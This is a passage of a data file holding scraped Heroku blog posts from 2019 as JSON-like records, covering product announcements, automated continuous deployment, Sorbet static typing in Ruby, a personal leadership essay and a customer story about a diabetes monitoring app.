heroku dot com. Your feedback helps us improve our products, processes, and policies. security maintenance kafka redis postgres database data", "date": "2019-07-23,"},
{"website": "Heroku", "title": "Announcing General Availability of Heroku Enterprise Accounts", "author": ["Sepideh Setayeshfar"], "link": "https://blog.heroku.com/enterprise-accounts", "abstract": "Announcing General Availability of Heroku Enterprise Accounts Posted by Sepideh Setayeshfar September 12, 2019 Listen to this article Today we are thrilled to announce the general availability (GA) release of Heroku Enterprise Accounts . All Enterprise Teams associated with a company are nested under an Enterprise Account which delivers a higher level of visibility and accountability. With an Enterprise Account, executives and admins can ensure trust and improved agility with simple fast management of teams, users and expenses, so application development teams can stay focused on the development process. With applications sitting at the core of almost all businesses, collaborative environments that make it possible for users to efficiently work together without security concerns are essential to the success of any company. The release of Heroku Enterprise Teams a few years back made it possible for our customers to manage their applications in secure, isolated environments and get access to detailed app permissions and usage reports. With most enterprise companies using many Enterprise Teams across different parts of the organization, there was an essential need for a management console from which executives and admins could get visibility into different teams and users. Enterprise Accounts addresses this need as a new secure layer at the highest level of a company’s hierarchy with features offering full visibility and control over all users, Enterprise Teams, and resources. Fast and Easy Team and User Management Enterprise Accounts brings agility to your organization. If the organization is growing, or re-organizing teams based on projects or business units, and needs new Enterprise Teams, there is a “Create team” option available to enable users with the “Create” permission and admins of the Enterprise Account to create as many new Enterprise Teams as they need. Administrators can also easily find and modify user permissions, add or remove new users, and access any Enterprise teams across the company to view or make changes via various search and filtering options. Improved Control and Visibility with Company-wide Reports It’s often challenging for growing organizations to keep track of their usage across the company and avoid overages. With Enterprise Accounts, billing admins have the ability to easily download detailed monthly and daily usage reports that display the resource consumption of all the Enterprise Teams across the company. In addition, the usage break down chart and graph provide a quick and more visual way to keep an eye on resource consumption across the company. In addition to usage reports, monthly auditing reports are also available in Enterprise Accounts, enabling enterprise customers to meet auditing and accountability requirements. These reports, currently generated in JSON format only, capture major events related to private spaces, apps, add-ons, and more. Secure at All Levels Yet Easy to Use At Heroku, protecting development environments, applications and users, without sacrificing simplicity and ease of use, has always been a top priority. With Enterprise Accounts, companies can set up SSO at the Enterprise Account level which will be applied to all Enterprise Teams within the account. There is also an option to simply migrate an existing SSO configuration from an Enterprise Team to the Enterprise Account. Once SSO is set up, there is a minimal chance of being locked out due to an expired certificate. Users with “Manage” permission on the Enterprise Account get three notification emails at thirty, seven, and one day(s) before a license is set to expire, giving them ample time to respond and update it. In addition, there are options to add up to three certificates at any given time. Once an existing certificate expires, a valid one will replace it automatically. While there are options to set up SSO and users can also configure 2FA for their accounts, there might still be cases where a user skips using either. The security status of all users is visible at the Enterprise Account level which helps the administrators find risky accounts quickly. Customer Spotlight Many Heroku customers started using Enterprise Accounts during the private and public beta states. GMO Pepabo, Inc., a web hosting service company based in Japan, is using Heroku for two specific services: Suzuri (custom design/order e-commerce service) and Colorme-repeat (A subscription service marketplace for daily commodities). “I’ve found the Enterprise Accounts feature set very useful. We are using Private Spaces and Common Runtime across two Enterprise Teams for different projects and it used to be very tedious to switch between these teams to manage deployment environments or looking at metrics. With the new Enterprise Accounts features, I can manage both Enterprise Teams in a single view. It has also become very easy to control the authorization. Enterprise Accounts already had me with the possibility of managing environments from a unified place. Now I’m excited to try out its audit logs and other features as well.” Hiroshi Shimoju, Software Engineer\nGMO Pepabo, Inc. Envoy provides secure and compliant visitor and delivery management solutions that they deliver through the Heroku platform. \"Enterprise Accounts have been a great help for us getting SOC2 compliance. Enterprise Account permissions are also a big step in security, allowing us to move towards the principle of least privilege for our organization while still being easy to use for our development team.\" Mike Chan, VP of Engineering\nEnvoy Feedback Welcome We hope you enjoy using this new feature set and find it helpful. Please visit Dev Center for more information on Heroku Enterprise Accounts. Your feedback is highly valuable, please write to us at enterprise-accounts-feedback@salesforce.com about your experience with the product or with your feature requests. Learn More Join our technical webinar on secure, enterprise collaboration with Heroku customer Calendly on Tuesday, October 29, 2019, at 10am PDT. Stay tuned for details. agility secure collaboration teams enterprise accounts", "date": "2019-09-12,"},
{"website": "Heroku", "title": "Up to 75% Faster Maintenances with Heroku Postgres and Redis Premium Plans", "author": ["Corey Purcell"], "link": "https://blog.heroku.com/faster-maintenances-with-heroku-postgres-and-redis-premium-plans", "abstract": "Up to 75% Faster Maintenances with Heroku Postgres and Redis Premium Plans Posted by Corey Purcell August 28, 2019 Listen to this article As outlined in a previous blog post , Heroku Data services undergo routine maintenances for security and patching. In this post, we describe the process used to minimize downtime for Heroku Postgres and Heroku Redis premium ‘High Availability’ plans and how we optimized the process to perform up to 75% faster. Data Services Architecture High availability plans for Postgres and Redis are designed to have two database instances running at the same time. One is a writeable primary database server and the other is a read-only hidden standby. Since the standby is hidden, customers cannot access it during normal operations. Before starting a planned maintenance, we do our best to ensure that your standby is fully caught up with your primary. During the maintenance, we replace the primary with its standby (now new primary), and tell your app to start to connecting to the new primary instead of the old one. We then build a new standby in the background. If your app attempts to write to the old primary after the old standby unfollows it, you may experience lost writes. The most critical part of the maintenance is ensuring your app connects and writes to the proper database instance. The Old Way of Controlling Writes During a Maintenance In the past, we changed the config var in your app so that your DATABASE_URL would point to the standby and trigger an app restart to ensure that your app reconnected to the read-only standby. While this is happening, your primary could still accept writes and replicate them to the standby. During the rolling restart of your app’s dynos, you could have apps connecting to both database instances. To ensure that lost writes are minimized, we would terminate the primary instance. Any long-running transactions are given time to complete as the database instance shuts down safely. The maintenance then needs to pause long enough to ensure that any writes are replicated from the shutting down primary to the standby. Once the primary is shutdown, the standby can stop following the primary, exit read-only mode, and become the new primary. At this point, your app should no longer see errors connecting to the new primary. The maintenance then finishes cleanup and builds a new standby to follow the new primary. The New Way of Controlling Writes During a Maintenance As mentioned above, the old way waits for the primary to safely shutdown, which means downtime can be extended by long-running transactions. The new method immediately redirects any new connections to the new primary/old standby, which ensures that no connections are made to the old primary. We then kill any existing connections to the old primary. Your app may see connection errors at that point, but any reconnections safely move to the new primary. The ensuing rolling restart of your app correctly points all dynos to the standby. Now that any connections to the old primary are redirected, we know that no further writes can be written to the old primary. It is safe for the old standby to unfollow the old primary, exit read-only mode, and become the new primary. We can now safely perform the unfollow step much quicker than in the past. We also gain additional control over the steps of the maintenance and ensure that tail latencies are greatly reduced. The New Way Is Up to 75% Faster This new approach brings significant improvements to the most critical and potentially problematic parts of maintenances. As a result, we now see maintenances for HA data services complete in 15-40 seconds, a big improvement on the 60 seconds or more required before. Heroku’s own internal databases now use this behavior for performing maintenances, and we’ve reduced customer impact to the point that in many cases we can act without advance notice. Best of all, this is now the default behavior for maintenances on Heroku Postgres and Heroku Redis databases with Premium, Private, or Shield plans. As always, we are constantly working to minimize the downtime caused by maintenances. high availability redis postgres", "date": "2019-08-28,"},
{"website": "Heroku", "title": "Automated Continuous Deployment at Heroku", "author": ["Bernerd Schaefer"], "link": "https://blog.heroku.com/automated-continuous-deployment-at-heroku", "abstract": "Automated Continuous Deployment at Heroku Posted by Bernerd Schaefer October 22, 2019 Listen to this article Over the past four years, the Heroku Runtime team has transitioned from occasional, manual deployments to continuous, automated deployments. Changes are now rolled out globally within a few hours of merging any change—without any human intervention. It's been an overwhelmingly positive experience for us. This post describes why we decided to make the change, how we did it, and what we learned along the way. Where We Started Heroku’s Runtime team builds and operates Heroku’s Private Space (single-tenant) and Common Runtime (multi-tenant) platforms, from container orchestration to routing and logging. When I joined the team in 2016, the process for deploying changes to a component looked something like this: If it's Friday, wait until the next week If you have less than 3 hours to monitor or respond to issues, wait to deploy Join the operations channel in Slack Share your plans in the channel and get sign-off from the team-member who is primary on-call that week Open the platform integration test dashboard Open any relevant monitoring dashboards for the service Actually deploy the change Monitor dashboards for anomalies Monitor the operations channel for notifications and alerts Wait a while... ... and then repeat for the next region or service as needed The process was manual, repetitive, and required coordination and extra approvals. It was toilsome. However, it also served the team well for a long time! In particular, at that time the team was small, owned few services, and had just two production environments (US and EU). Notice that this process already relies on some important properties of the system and the engineering environment within Heroku: Changes were released as often as the team was comfortable and had time to respond to emerging issues. Changes were rolled out as a pipeline into environments in order of blast-radius. Heroku has a platform integration testing service (called Direwolf) which continuously runs a suite of tests against the platform in all regions and reports status. There were metrics dashboards and alerts to understand the service health and debug issues. These properties would help us transition from this toilsome process to one that was automated and continuous. Why Automated Continuous Delivery? We understood that there were opportunities to improve the deployment process, but it worked well enough most of the time that it wasn't a big priority. It was toil, but it was manageable. However, what passes for manageable changes as systems evolve, and two particular things changed that forced us to re-evaluate how we managed deployments: The team rapidly grew from a handful of engineers to over 30. We undertook a long-range project to refactor Heroku’s Common Runtime which would both shard our production environments and begin to decompose our monolithic app into multiple services. Between these two changes, we knew it wouldn’t be sustainable to simply make incremental changes to the existing workflow; we had to bite the bullet and move to a fully automated and continuous deployment model. Increasing Deployment Complexity The primary control system for the Common Runtime was a monolithic Ruby application, which changed infrequently (< 1 change per week) and was running in two production environments. The sharding project had us actively working (multiple changes per day) on multiple services running in 12 environments (2 staging, 10 production). The cost of every manual step was amplified. Pulling up the right dashboards for an environment used to cost a few minutes a week, but could now be hours . Waiting 3 hours between deploys and looking at graphs to notice anomalies? Totally untenable. Higher Coordination Costs The original process was to merge changes, and then release them ... at some point later. It was common to merge something and then come back the next day to release it. These changes might require some manual operations before they were safe to release, but we were able to manage that by dropping a message to the team, \"Hey, please don't deploy until I've had a chance to run the database migrations.\" As we brought more people on to the team and increased activity, however, this became a major pain point. Changes would pile up behind others, and no one knew if it was safe to release all of them together. We also introduced a set of shared packages to support the development of our new microservices. This introduced a new problem: one set of changes could impact many services. If you're working on one service, and introduce some changes to a shared library to support what you want to do—you'll deploy the one service and move on. We would regularly accumulate weeks worth of undeployed changes on services, which were probably unrelated but represented a major risk. We needed to shift to a model where changes were always being released to all of our services. How We Did It To build our new release system, we made use of existing Heroku primitives. Every service is part of a Pipeline . The simplest services might only be deployed to staging and production environments, but our sharded services have up to 10 environments, modeled as Heroku apps running the same code but in different regions. The pipelines are configured to automatically deploy to the first app in staging when a change is merged into master and CI has passed. That means that for any service, changes are running in staging within a few minutes of merging. Note that this is not something custom we built—this is a feature available to any Heroku Pipelines user. This is where we would previously begin checking dashboards and watching ops channels before manually executing a pipeline promotion from the staging app to the next app in the pipeline. Automation To The Rescue We built a tool called cedar-service-deployer to manage the rest of the automated pipeline promotions. It’s written in Go and uses the Heroku client package to integrate with the API. The deployer periodically scans the pipelines it manages for differences between stages. If it detects a difference, it runs a series of checks to see if it should promote the changes. The suite of checks for every service are: Age . The age gate will only open after 30 minutes, to allow time for integration tests to run and any potential alerts to go off. Allow . Fails if promotions are paused globally (e.g., during Dreamforce or other large customer-facing events) or for a particular service. GitHub . The deployer will only promote changes which are present on the master branch. Incident . This check fails if there’s a relevant incident open on the Heroku status site . Librato . Each service is configured with a list of Librato alerts to monitor, and promotion is paused as long as any are actively firing. URLs . This is a generic check, which passes as long as the configured URLs return an HTTP 200 OK status code. We use this in particular to check the status of our platform integration tests. If any checks fail, it does nothing and waits for the next tick to check again. Once all the checks pass, it executes a pipeline promotion to push the changes to the next stage and then repeats. The deployer itself is stateless; every time it runs it checks the state with the Heroku API. It also doesn’t have a strict concept of a “release.” Instead it’s always trying to reconcile differences between stages in the pipeline. That means there can be concurrent releases rolling out over time, for example here, where the 813a04 commit has been rolled out from qa01 through to va05 while at the same time 4cc067 is one stage away from completing its rollout. Key Learnings There are a few things in particular that made the project successful: Start small . We tested out the first version of the deployer on a service that was still in development and not yet in production. We were able to learn how it changed our process and build confidence before it was critical. Make onboarding easy . Adding a new service to the deployer only requires configuring a pipeline and a list of alerts to monitor. Once the smaller-scale experiments showed success, people started moving services over on their own because it took less time to configure automated deploys than to perform a single manual one. Build on existing ideas and tools . Our automated deployments are not fundamentally different from the manual deployments we previously performed. Engineers didn’t need to learn anything new to understand it—or to take over and manage some changes themselves. We also learned a few unexpected things along the way! Isolate early pipeline stages . You might have noticed that staging had two apps, “qa01” and “st01”. We originally only had a single staging environment. But staging is a shared resource at Heroku! Every stage in the pipeline builds more confidence in the release, and we found we needed an environment that only impacted our own team,  and not any other teams at Heroku. Engineers apply a lot context that computers need to be taught . Over time, we’ve added additional promotion checks that were obvious to engineers but not so obvious to our deployer! Would you deploy a service while there was an open incident? Probably not, but our deployer did! Now it checks the Heroku status site for open incidents to limit changes to the system while we’re responding. We also allow engineers to test changes in staging before they are merged. Would you immediately promote those changes to production? Probably not, but our deployer did (oops). It now checks that changes exist in master, so we don’t roll out changes that aren’t ready. Master should be deployable != must be deployable . We used to have the policy that “master should always be deployable”, but there’s a big difference between should and must . With an automated, continuous deployment system there’s no room for the occasional manual operation synchronized with release. We reach much more frequently today for internal feature flags to separate the deployment of changes from enabling the feature. We also had to change how we handle database migrations, separating out changes that add a migration from code that depends on it. Confidence from coverage . It used to be common to “babysit” a deploy and execute a manual test plan as it rolled out. Today we depend entirely on our alarms and platform integration tests to signal that changes are safe to roll out or if a deploy needs to be halted. That makes it more important than ever to ask about each changeset, \"How will we know if this breaks?\" Conclusion It’s been about 2 years since we turned on automated deployments for our first service. It now manages 23 services. Instead of hours of checking dashboards and coordination to roll out changes, Runtime engineers now just hit “merge” and assume their changes will be released globally as long as everything is healthy.", "date": "2019-10-22,"},
{"website": "Heroku", "title": "Overcoming My Fear of Failure", "author": ["Anand Gurumurthi"], "link": "https://blog.heroku.com/overcoming-my-fear-of-failure", "abstract": "Overcoming My Fear of Failure Posted by Anand Gurumurthi October 22, 2019 Listen to this article As part of my MBA at Carnegie Mellon University, I enrolled in a Leadership development certificate program. I was given the opportunity to work with an amazing Leadership Coach, ( Laura Maxwell ). Laura helped me on my journey of \"overcoming my fear of failure\". As part of the program, I was able to share my story with the dean, professors, and the leadership development center at CMU. Since this is a rather common experience, I wanted to share my story with all of you as well. This story starts, as many do, in childhood. Growing up in India, there has always been the expectation that everyone gets good scores in tests and succeeds in any initiative they take part in. This identity is ingrained in our society beginning at a very young age. Thus,  it became  a natural tendency for me to navigate towards opportunities where I had a higher chance of success and ignore opportunities where I might fail. During my first conversation with Laura as part of my leadership journey, she asked me what aspects of myself I wanted to work on. One thing I had begun noticing was that I lost interest in many projects after starting to work on them. As we talked more, it was becoming obvious that there was a similarity in all of these projects; I was not pushing me outside my comfort zone where I could fail. As we kept peeling away more and more layers of this feeling, we were able to tie it to the environment and the impact my culture had on me. As we had identified the problem, we were ready to jump into the analysis phase. My first exercise was to introspect and look back at the past few months and analyze all the projects that I could have picked up and which ones I ended up picking. For the ones I didn't pick, I analyzed why I made that choice. There was a common pattern-: all of them had some element that would push me outside my comfort zone and I was afraid that I would fail. Here is just one example of an amazing opportunity that I missed. A good friend of mine in a different department had a recent opening in their team. They were really confident that I would be successful in that role and it would allow both of us to work together again. My subconscious kicked in immediately and I joked off that opportunity and didn't give it a second thought. Doing this analysis helped me identify a blind spot and provided me an opportunity to work on to improve myself. I shared this with Laura who was really supportive and encouraged me for sharing this. She was aware that this was not easy for me and her constant encouragement encouraged me to push further. Having done this analysis ensured that I keep my eyes open for opportunities in the future. My most recent change is a testament to this change in behavior. My mentor had recently switched teams and I reached out to him to see if there were any openings in his new team that I could apply to. He was really happy that I reached out to him and mentioned that there was indeed a role which he thought I would be a good fit for. He and I started talking about this role and my mind started formulating all the possible reasons in which I will fail in this new role and was trying to push me away from applying for this role. My mind was suggesting to me that taking on this role meant that I would fail. Instead of ignoring those feelings, I acknowledged them and started making a note of all the topics that triggered this fear and was causing me anxiety about this new role. After the meeting, I spent some time introspecting and identifying steps that I can take to reduce my chances of failure in this new team. Doing this exercise reduced my stress level dramatically and my mind started to calm down. I was now able to see --for the first time! -- that I had a shot at this new role and I decided to pursue it. As part of the interview process, I even shared some of the things that were causing me anxiety and my ideas on how to mitigate this. My mentor was impressed with the preparation. The interviews went great and I started at Heroku last October! I have learned so many new things and there is always something new that I discover every single day. I would often find myself in situations where I had no idea what I was doing. My heart rate would increase and my mind will start worrying. I would then pause and tell myself that I am operating outside my comfort zone here and start looking at the problem as a learning opportunity. After having run into quite a few different types of problems, I am starting to feel confident when presented with a unique problem.\nAnother thing I have started doing now is reaching out to friends and colleagues who had presented me with opportunities in the past. I usually start off with apologizing for not pursuing the opportunity they presented or at a minimum give it a second thought and also share with them this amazing journey I have been on. I also thank them for keeping me in their thoughts when they come across these opportunities and for going out of their way in bringing them to me. What I gained from this Understanding the root cause for my fear of failure. A framework that I can use when I encounter an opportunity that is outside my comfort zone. Working on interesting problems. Constantly learning. Reengaging with friends and strengthening my network. Have you felt something like this in the past? If so read on: Understanding your blind spots Reflect on the last few projects you worked on. Understand the similarities and differences among them. If you actively chose to work on these projects, think about what caused you to pick these projects. Think about the last few times a potentially crazy opportunity came your way (it could be from a recruiter, from a colleague, your manager etc) and you were 100% confident that it was not for you and immediately moved past it. Keeping an open mind think back on those projects and see if there are any preconceived notions that you might have that made you do that. Doing these two exercises will hopefully help you understand your triggers and blind spots. Pushing beyond your comfort zone Now with your recently acquired super power (aka knowing your blind spots), keep an open eye on any future projects / opportunities that come your way. Stop yourself before you say no. Take a moment to imagine yourself working on the project and go through the thought experiment of all possible events that could take place in the project. Keep a note on what places you thought you succeeded and failed. Ask yourself if you can push yourself to learn and anticipate and resolve the failures in real life? Remember, you don't have to do it all yourself. Do you know someone (maybe a mentor or a friend) that you think are really good at solving those types of problems? Reach out and ask for help! Oh and say yes to that project! You can do it! Fear of failure Management Leadership Self Improvement", "date": "2019-10-22,"},
{"website": "Heroku", "title": "Apache Kafka on Heroku Shield is Now Generally Available", "author": ["Scott Truitt"], "link": "https://blog.heroku.com/apache-kafka-heroku-shield", "abstract": "Apache Kafka on Heroku Shield is Now Generally Available Posted by Scott Truitt October 01, 2019 Listen to this article We are thrilled to announce that Apache Kafka on Heroku Shield is now generally available and certified for handling PHI, PII, and HIPAA-compliant data. Our newest managed data service unifies Heroku Shield, a set of Heroku platform services that offer additional security features needed for building high compliance applications, with Apache Kafka on Heroku, our fully-managed service based on the leading open-source solution for handling event streams. Organizations of all sizes face relentless pressure to bring better apps and experiences to market, and those with a strong focus on data security like Health and Life Sciences (HLS) organizations need to balance safety and agility. Their customers rightly demand the same fit and finish, not to mention performance and responsiveness, as they get with the apps they use every day. Increasingly, these apps are built on both real-time and relational data — sensitive, protected, regulated, and highly-personalized data. Nothing is more important than keeping that data safe and secure. Build Real-Time Apps with Secure Data, More Easily than Ever Before Apache Kafka on Heroku Shield, organizations building HIPAA-compliant apps and experiences with events and streams needed advanced knowledge of operating, configuring, and updating their Kafka clusters, as well as validating security and compliance. Apache Kafka on Heroku Shield allows enterprises to easily work with real-time data in a secure, trusted and compliant environment. The service fully automates Day 1 and Day 2 operations: provisioning, management, availability, and resiliency. Security patches are handled automatically, and you can upgrade your clusters, in place, for new Apache Kafka versions with a single command. Service resiliency is also automated; unavailable brokers are automatically replaced, and the service will re-establish failed elements of the cluster. We provide tuned configurations and plans for your broker and zookeeper nodes that handle a wide range of use cases out of the box, from testing and managing low volume production event streams, to handling a massive velocity and volume of events. Apache Kafka on Heroku Shield is built upon the same foundation we use to protect our platform. Security is the goal and end-result of our excellence in engineering, and our compliance program is used to verify and get full-credit for the controls we both need in the shared responsibility security model. Apache Kafka on Heroku is available in all 6 Heroku Shield Private Spaces regions: Dublin, Frankfurt, Sydney, Tokyo, Virginia, and Oregon. PCI compliance for Apache Kafka on Heroku Shield is expected in the spring of 2020. Creating your Kafka clusters is as simple as adding the service to a Heroku app: $ heroku addons:create heroku-kafka:shield-standard-0 -a sushi-app About Heroku Shield Heroku Shield , first released in June 2017, was built to bring the power and productivity of Heroku to a whole new class of strictly-regulated apps. The outcome is a simple, elegant user experience that abstracts away compliance complexity while freeing development teams to use the tools and services they love. Heroku Shield Postgres, also released in June 2017, guarantees that data is always encrypted in transit and at rest. Heroku also captures a high volume of security monitoring events for Shield dynos and databases which helps meet regulatory requirements without imposing any extra burden on developers. Heroku Shield Connect, first released in June 2018, enables the high performance, fully-automated, and bi-directional data synchronization between Salesforce and Heroku Shield Postgres — all in a matter of a few clicks. About Apache Kafka on Heroku Heroku’s fully-managed service provides all the power, resilience, and scalability of Kafka without the complexity and challenges of operating your own clusters. Available in low-cost, shared multi-tenant plans or in dedicated private clusters, Apache Kafka on Heroku is fully-integrated with the Heroku platform, managed data services, and third-party ecosystem of services. Feedback Welcome We hope you enjoy using this new feature as much as we enjoyed building it, and we can't wait to see what you do with it. Existing Heroku Shield customers can get started today . For more information, see the Dev Center articles for Heroku Shield or Apache Kafka on Heroku , or contact Heroku. Please send any feedback our way. Want to learn more about Apache Kafka on Heroku Shield? Contact sales Heroku Enterprise HIPAA data postgres compliance security Shield apache kafka", "date": "2019-10-01,"},
{"website": "Heroku", "title": "Static Typing in Ruby with a Side of Sorbet", "author": ["Jason Draper"], "link": "https://blog.heroku.com/static-typing-ruby-with-sorbet", "abstract": "Static Typing in Ruby with a Side of Sorbet Posted by Jason Draper October 31, 2019 Listen to this article As an experiment to see how static typing could help improve our team’s Ruby experience, we introduced Sorbet into a greenfield codebase with a team of 4 developers. Our theory was that adding static type checking through Sorbet could help us catch bugs before they go into production, make refactoring easier, and improve the design of our code. The short answer is that yes, it did all of that! Read on to learn a little more about what it was like to build in a type safe Ruby. The Sorbet project's logo Static typing vs dynamic typing Ruby is a dynamic language, which means that types are checked when the code is run. If you try to call a method on an object that does not exist, the compiler will not complain, you'll only find out about that error when the code is executed and you get a NoMethodError . Static languages avoid this problem. In a static language, such as Java, the compiler is told or can interpret the type of each variable, and return values from a method or function. This means, among other things, that if you try to call a method that does not exist on an object you will get an error at compile time. # Ruby code\nuser = \"Jessica\"\nuser.send_email  # Fails with NoMethodError when the code is executed // Java code\nString user = \"Jessica\";\nuser.sendEmail();  // Fails at compile time Statically typed languages usually have more overhead in that you need to declare the types of your objects. The added advantage is that they can possibly prevent errors in your code before they're exposed to a user. Which is where Sorbet comes in. Originally developed by the Stripe team, it lets you use Ruby like you normally would, but also gain the advantages of static type checking. Sorbet accomplishes this in two ways, the first is by using static linting of the files. While that can help you enforce types to a certain extent, the more effective way of type checking is to have the linting happen at runtime. Sorbet will inject itself into each method call and verify that the parameters and return value match what is defined in your signature. This checking adds practically no additional processing time, so there’s no performance issues to worry about. In the Ruby example above, instead of getting a NoMethodError , with Sorbet, you’d get Method send_email does not exist on T.class_of(String) . That’s a much more useful error message for a developer. Working with Sorbet Setup Sorbet is designed to be added to existing codebases so the development team has spent a lot of time perfecting that experience. The process of getting the project set up on basic type checking was very easy, you only need to run sorbet init to commit the initial configuration files. After setting up the configuration files, you can use sorbet tc to run type checking. Setting up our CI server only required adding an additional call to sorbet tc . RBI files For code that is not part of your application, Sorbet provides the option to use RBI files, which are similar to header files in other languages. They are files that allow you to add the method signatures of code that you do not control. This feature is useful to make sure that when you’re using code from a gem, you can still get the benefits of static typing. Instead of making you do the work of defining a new RBI file for each gem you use, Sorbet also has a GitHub repo where users can add RBI files for gems and version them, this is similar to the TypeScript DefinitleyTyped repo. They provide a command line tool that will scan your gems and pull down any RBI files that are available. These files are then committed to your repo. Gem authors can also provide an RBI file in the gem source, as Sorbet supports that directly, but most authors have not added signatures. Rails & Sorbet The meta-programming features of Ruby often come in direct conflict with the static typing of Sorbet. One of these issues is Rails and ActiveRecord. When using an ActiveRecord model, you will have methods defined on the class, based on columns in the database. If you would like to be able to use static typing when interacting with these models, you must create RBI files for your models and add the signatures for the methods as you use them. # typed: strong\n\nclass User < ActiveRecord::Base\n  extend T::Sig\n  extend T::Generic\n\n  sig { params(id: String).returns(T.nilable(User)) }\n  def self.find_by_id(id); end\nend sorbet/rbi/app/models/user.rbi , a Ruby Interface , or RBI, file There is a gem, sorbet-rails , that will attempt to analyze your Rails app and generate the RBI files automatically. As with Sorbet, the project is still young. It was helpful in jump starting some of our typing, but it still misses or mistypes certain fields. Editors Sadly, very little editor integration is supported at the moment. The Sorbet team is still keeping their plugins closed source until they’re ready for release. For editors that support a way to easily add custom checks, such as Ale in Vim, the CLI works great and is fast enough to give quick feedback. I’m sure that the development experience will improve significantly once the editor integration is available. The wins We had a strong belief that Sorbet could improve our development experience by lowering our errors and showing us possible problems earlier in our local development. We were very pleased to find that as soon as we added Sorbet and types to our project, Sorbet immediately pointed out a problem in our code! As we continued to add types, Sorbet exposed more issues. I've noted a few of the more interesting problems Sorbet helped us to resolve. Calling a method twice instead of storing the result Sorbet complained that we were not properly checking the return type of a method that we called.  We did not check that because the same method was called previously in the method and the assumption would be that the underlying value would not change.  While that is probably true in almost every case, given our knowledge of that class, we can avoid the problem by assigning the variable out. In this case, Sorbet made our code more reliable. Exposing columns that allowed null values We decided that we would try our best to not allow nils into our type signatures unless it was unavoidable. This meant that we would rewrite our code where necessary to accommodate this decision. Early into this process, Sorbet made it apparent that we had some columns in our database that we had allowed to be null when that was not what we wanted. This prompted a migration on our database to prevent future problems. Enforcing a null return Using Sorbet to define the params and return type can sometimes provide a small benefit by removing tests. In particular there were some tests in our app that were ensuring that the methods returned nil or true , as a dummy value so that callers would not rely on the value. Using type checking allows us to remove those explicit returns. In the case of a method that we do not want to use the return value, Sorbet, provides a void return type that will return a dummy value. Sorbet can also remove guard clauses such as raise Error if arg.nil? by using params checking. This can lower the complexity of the code and the number of tests that are written. Conclusion Time will tell if Sorbet is a good long term addition, but in the short term, our experience has been very positive. Getting the initial project up and running was very quick and most of the bugs we hit were related to the young age of the Sorbet project. The project maintainers have built a system that stays out of the way until you want it to help and when it does, it provides a solid experience. Check out the in-browser Sorbet Playground to try Sorbet out without having to download and set up the gem in your codebase. static typing types ruby", "date": "2019-10-31,"},
{"website": "Heroku", "title": "Improving the Lives of People with Diabetes", "author": ["Lee Rong"], "link": "https://blog.heroku.com/improving-the-lives-of-people-with-diabetes", "abstract": "Improving the Lives of People with Diabetes Posted by Lee Rong November 15, 2019 Listen to this article Today, many people with diabetes are choosing to manage their condition using devices called continuous glucose monitors (CGMs). Not only do they replace the need for most finger prick testing, but they also provide a stream of data round the clock. However, like all data, it’s only as useful as the tools that analyze it. That’s where Sugarmate comes in. Created by serial entrepreneur Josh Juster to help manage his own condition, Sugarmate combines a Heroku back-end with web, mobile, and smartspeaker apps to provide life-changing alerts and analysis for people living with diabetes. Alexa, what’s my blood sugar level? For 26 years, Josh has himself been living with type 1 diabetes, and managing the condition has become an essential part of his daily routine. For much of that time, that meant checking his glucose level several times a day using blood from a finger prick.\nBut then, a few years ago, Josh switched to using a device called a continuous glucose monitor. Attached to his body, the monitor automatically took a reading every five minutes and sent it to his smartphone. This was a big improvement, but another device led Josh to see even greater potential. Around the same time that he started using the glucose monitor, Josh had also bought an Apple Watch and he realized that the watch’s face would be the most convenient way to check his blood sugar. However, there was a problem. Apple enforces a hard limit on how often each app can update the watch’s face. Josh wanted to glance at his watch and see the most recent reading, but Apple’s APIs would only let him update the watch face about two to three times an hour. That would have made the Apple Watch useless, as a reading that is 20 minutes old is already out of date and information is needed immediately. Rather than give up, Josh found a clever solution. He realized that Apple put no limits on how often its own Calendar app could update the watch face. So, he built an app that pushed his glucose monitor’s readings into a calendar that was then viewable on his Apple Watch. What started out as a convenient app for his own use soon won users over within the broader diabetes community and Sugarmate was born. Below Normal Call However, with all that data available, there’s more to Sugarmate than conveniently displaying the user’s blood sugar level. In particular, Sugarmate brings a whole new level of patient safety to blood glucose management with two alerting features. \nOne, known as “Below Normal Call,” triggers a phone call to the user’s chosen number whenever their blood sugar reading drops below its normal level. This is revolutionary. With Sugarmate, the user can go to sleep knowing that if their blood sugar level becomes dangerous, then they’ll be woken by a phone call. Another alerting feature is a favorite of parents who use Sugarmate to monitor their children’s blood glucose levels. When the user’s blood sugar level becomes dangerous, Sugarmate sends a text message to an emergency contact, along with GPS coordinates of where the person is at that moment. That means that a trusted person can come and help the Sugarmate user when they need it.\nWhat started out as a way for Josh to monitor his own condition has now seen uptake around the world. Billions of readings To date, Sugarmate has recorded billions of readings from users. For the lean team that handles the back-end ops, it has been an interesting challenge to not only manage that volume of data, but also to build a back-end to analyze it and send potentially life-saving alerts on time. So, what does the Sugarmate back-end look like? Small team, big operation The journey begins when Sugarmate’s Ruby on Rails back-end polls for new glucose readings. Today, those readings go straight into a Heroku Postgres database. Like many people dealing with high volumes of inbound data, Josh considered other options, such as third-party NoSQL services. However, he found that keeping everything on Heroku made it easier to scale and saved him money. Scaling to meet demand As a lean team, the Sugarmate crew relies on Heroku and third-party add-ons to automate their operations. The power needed to process readings is relatively predictable, meaning that the team can manage their dynos manually as new users join. However, some scenarios require dedicated processing resources. For example, when a user requests a report in the app, Sugarmate’s back-end uses a third-party tool called HireFire to automatically deploy a new dyno specifically to process that report. Once the report is delivered, the dyno shuts back down. Scaling from one user to thousands Building Sugarmate on Heroku has allowed Josh to turn a personal project into something that improves the lives of thousands of people living with diabetes. According to Josh, he couldn’t have done it without Heroku.\n“Starting out as the only person managing the entire back-end was challenging, but fun. The great thing, though, is that running on Heroku has made it totally doable for a small team. Right now, we have more than 30 Heroku Dynos running — all without needing a dedicated ops team.” In particular, Heroku has given Josh the space to grow Sugarmate and discover what works, without the financial pressure of needing to invest in an ops team. Next, Josh will explore ways to monetize Sugarmate, while continuing to provide a service to the broader diabetes community. For me as a member of the Heroku team, Sugarmate is an important reminder of how our work impacts others. Sometimes it can be easy to get caught up in the excitement or frustration of working with this new framework or that new technology. But software is about making a difference in people’s lives. I love that Heroku helps software developers, like Josh, by solving a whole bunch of problems that enable him to get on with building something valuable to individuals. And, while Josh deserves the credit, I take some small amount of pride in knowing that Heroku helped him get there . Read the Sugarmate case study to learn more about how Josh built Sugarmate on Heroku. giving back doing good community diabetes", "date": "2019-11-15,"},
